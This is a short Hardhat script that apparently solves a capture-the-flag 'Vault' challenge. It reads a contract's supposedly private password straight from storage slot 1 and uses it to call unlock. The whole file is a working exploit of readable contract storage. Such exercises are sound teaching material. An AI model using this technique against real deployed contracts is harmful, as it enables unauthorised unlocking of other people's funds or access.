import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x8dAF17A20c9DBA35f005b6324F493785D239719d";
const PLAYER_ADDRESS = "0x976EA74026E726554dB657fA54763abd0C3a0aa9";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Vault", CONTRACT_ADDRESS, signer);

    const password = await ethers.provider.getStorageAt(contract.address, 1);
    await contract.unlock(password);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
